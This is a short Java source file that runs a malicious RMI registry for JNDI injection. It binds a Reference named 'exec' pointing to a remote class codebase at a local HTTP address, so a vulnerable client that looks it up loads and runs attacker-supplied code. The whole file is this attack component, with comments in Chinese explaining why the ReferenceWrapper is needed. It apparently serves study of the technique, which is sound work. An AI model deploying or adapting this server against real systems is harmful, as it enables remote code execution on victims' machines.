package org.dili.jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ReferenceServer {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.createRegistry(7777);

        // 创建Reference对象
        Reference reference = new Reference("test", "test", "http://127.0.0.1:8080/");
        // 由于Reference类没有继承Remote接口, 所以需要使用ReferenceWrapper进行封装
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("exec", wrapper);
    }
}
